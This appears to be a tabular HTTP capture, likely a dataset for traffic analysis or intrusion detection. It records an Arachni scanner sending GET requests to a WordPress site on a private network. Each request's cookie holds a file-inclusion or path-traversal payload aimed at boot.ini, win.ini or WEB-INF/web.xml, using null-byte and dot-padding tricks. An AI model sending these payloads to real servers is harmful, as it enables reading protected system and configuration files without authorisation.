http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3227						1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///boot.ini............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3228						1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=\boot.ini%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3229						1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=\boot.ini	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3230						1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://\boot.ini%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3231						1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://\boot.ini	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3232						1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/windows/win.ini%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3233						1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/windows/win.ini	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3234						1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///windows/win.ini%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3235						1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///windows/win.ini	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3236						1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=c:/windows/win.ini%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3237						1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=c:/windows/win.ini	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3238						1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://c:/windows/win.ini%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3239						1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://c:/windows/win.ini	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3240						1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/windows/win.ini............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///windows/win.ini............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=\windows\win.ini%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=\windows\win.ini	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://\windows\win.ini%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/winnt/win.ini	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/windows/win.ini............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///windows/win.ini............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://\windows\win.ini	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/winnt/win.ini%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///winnt/win.ini%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///winnt/win.ini	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=c:/winnt/win.ini%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=c:/winnt/win.ini	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://c:/winnt/win.ini%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://c:/winnt/win.ini	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/winnt/win.ini............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/winnt/win.ini............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///winnt/win.ini............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///winnt/win.ini............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=\winnt\win.ini%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=\winnt\win.ini	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://\winnt\win.ini%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://\winnt\win.ini	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/WEB-INF/web.xml%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/WEB-INF/web.xml	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///WEB-INF/web.xml%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///WEB-INF/web.xml	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
